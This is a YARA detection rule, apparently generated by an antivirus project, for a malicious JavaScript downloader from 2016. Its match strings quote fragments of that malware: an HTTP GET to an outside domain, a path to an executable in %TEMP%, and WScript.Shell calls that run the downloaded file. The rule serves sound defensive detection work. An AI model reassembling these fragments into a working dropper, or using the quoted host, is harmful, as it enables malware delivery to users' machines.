rule sig_20160328_d71d7f4f1dae8c7dd671c23a0bcd2fe5 {
  meta:
    description = "datamaliciousorder - file 20160328_d71d7f4f1dae8c7dd671c23a0bcd2fe5.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "76218aa98e11d54b82827486db871d5721a16b6181d09146f9ce7268f8d96ccc"

  strings:
    $s1  = "function Dyesncwu() {return Utmxyxkus[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"qEn4Xe67.exe\";};" fullword ascii
    $s2  = "do {WScript[Dicslfbya](Utkiwfrugb() * 11)} while (Srzjbro[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Utmxyxkus = function Pwpwpev() {return WScript[Cpgsikvm](\"WScript.Shell\");}();" fullword ascii
    $s4  = "Srzjbro[Xhpbjs](\"GET\", \"http://indochinaplazahanoi.info/fduew\", false);" fullword ascii
    $s5  = "function Ifkrcpqu(Fmfpc, Ysydqjvmj){return Fmfpc - Ysydqjvmj;};" fullword ascii
    $s6  = "function Bruvjqv() {return ((Qbxqxrnywn == true) && (Qbxqxrnywn == Fommocqkdb)) ? 1 : Bkeylvnhc;};" fullword ascii
    $s7  = "function Azkzsqx(Svwpoola){Utmxyxkus[\"Run\"](Svwpoola, Bkeylvnhc, Bkeylvnhc);};" fullword ascii
    $s8  = "function Oabiuwz(){return Ejsuszhb;};" fullword ascii
    $s9  = "function Zjrnoxfan(){return Cpgsikvm;};" fullword ascii
    $s10 = "Qbxqxrnywn = true; " fullword ascii
    $s11 = "return Ifkrcpqu(Sclyjy, Bxlgl);" fullword ascii
    $s12 = "function Ayishjz(Crefjoiw) {var Lvkxomt = (1, 2, 3, 4, 5, Crefjoiw); return Lvkxomt;};" fullword ascii
    $s13 = "var Qbxqxrnywn = false;" fullword ascii
    $s14 = "var Fommocqkdb = false;" fullword ascii
    $s15 = " while (Yqapdjtc){" fullword ascii
    $s16 = "var Mkcgerik = new this[\"Date\"]();" fullword ascii
    $s17 = "function Skvegwtkro()" fullword ascii
    $s18 = "Fommocqkdb = true; " fullword ascii
    $s19 = "function Utkiwfrugb(){return 22;};" fullword ascii
    $s20 = "var Yseokggi = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}